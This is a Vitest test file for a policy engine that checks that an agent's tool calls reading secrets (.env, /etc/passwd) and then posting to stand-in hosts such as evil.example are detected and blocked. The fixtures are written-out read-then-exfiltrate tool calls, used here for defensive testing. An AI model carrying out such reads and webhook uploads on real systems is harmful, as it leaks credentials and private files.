import { describe, it, expect, beforeEach } from 'vitest';
import { PolicyEngine } from '../../src/policy/policy-engine.js';
import type { CallContext, PolicyConfig } from '../../src/policy/policy-types.js';
import {
  evaluateCrossCallDataFlow,
  evaluateSessionDataFlow,
} from '../../src/policy/session-data-flow-guard.js';
import { extractCallDataFlowSignals } from '../../src/policy/call-signal-extractor.js';
import {
  MemorySessionDataFlowStore,
  resetSessionDataFlowStoreForTests,
} from '../../src/policy/session-data-flow-store.js';

function ctx(
  toolName: string,
  args: Record<string, unknown>,
  sessionId: string,
): CallContext {
  return {
    serverName: 'df-test',
    toolName,
    arguments: args,
    requestId: `req-${Math.random()}`,
    requestTokens: 10,
    timestamp: new Date().toISOString(),
    tenantId: 'test-tenant',
    sessionId,
    agentIdentity: { sub: 'agent-1', clientId: 'client-1', scopes: [] },
  };
}

describe('session data-flow guard', () => {
  beforeEach(() => {
    resetSessionDataFlowStoreForTests();
    process.env.GUARDIAN_DATA_FLOW = 'true';
    process.env.GUARDIAN_ML_SEMANTIC = 'false';
  });

  it('extracts sensitive read and exfil signals', () => {
    const read = extractCallDataFlowSignals(ctx('read_file', { path: '/home/user/app/.env' }, 's1'));
    expect(read.sensitiveReads.length).toBeGreaterThan(0);
    expect(read.isReadTool).toBe(true);

    const exfil = extractCallDataFlowSignals(ctx('echo', {
      webhook: 'https://evil.example/collect',
    }, 's1'));
    expect(exfil.isExfilTool).toBe(true);
    expect(exfil.exfilSinks.some((u) => u.includes('evil.example'))).toBe(true);
  });

  it('detects read-then-exfil across session history', () => {
    const history = {
      calls: [extractCallDataFlowSignals(ctx('read_file', { path: '/home/user/.env' }, 's2'))],
      lastUpdated: Date.now(),
    };
    const current = extractCallDataFlowSignals(ctx('echo', {
      message: 'post results to https://evil.example/upload',
    }, 's2'));
    const match = evaluateCrossCallDataFlow(history, current);
    expect(match?.rule).toBe('session-data-flow-read-then-exfil');
  });

  it('PolicyEngine blocks second call in session after sensitive read', async () => {
    const policy: PolicyConfig = {
      version: '1.0',
      policy: {
        mode: 'block',
        default_action: 'pass',
        data_flow: true,
        ml_semantic: false,
        rules: [],
      },
    };
    const engine = new PolicyEngine(policy);
    const sessionId = 'integration-session-001';

    await evaluateSessionDataFlow(ctx('read_file', { path: '/home/user/app/.env' }, sessionId));

    const second = await engine.evaluateAsync(ctx('echo', {
      webhook: 'https://evil.example/hook',
    }, sessionId));
    expect(second.action).toBe('block');
    expect(second.rule).toMatch(/session-data-flow/);
  });

  it('does not block unrelated calls in same session', async () => {
    const policy: PolicyConfig = {
      version: '1.0',
      policy: {
        mode: 'block',
        default_action: 'pass',
        data_flow: true,
        ml_semantic: false,
        rules: [],
      },
    };
    const engine = new PolicyEngine(policy);
    const sessionId = 'benign-session-002';

    const first = engine.evaluate(ctx('search', { query: 'kubernetes docs' }, sessionId));
    expect(first.action).not.toBe('block');

    const second = await engine.evaluateAsync(ctx('search', { query: 'helm chart versions' }, sessionId));
    expect(second.rule).not.toMatch(/session-data-flow/);
  });

  it('MemorySessionDataFlowStore retains call history', async () => {
    const store = new MemorySessionDataFlowStore();
    const key = 'mem:test';
    await store.appendCall(key, extractCallDataFlowSignals(ctx('read_file', { path: '/etc/passwd' }, 'x')));
    const snap = await store.getSnapshot(key);
    expect(snap.calls).toHaveLength(1);
  });
});
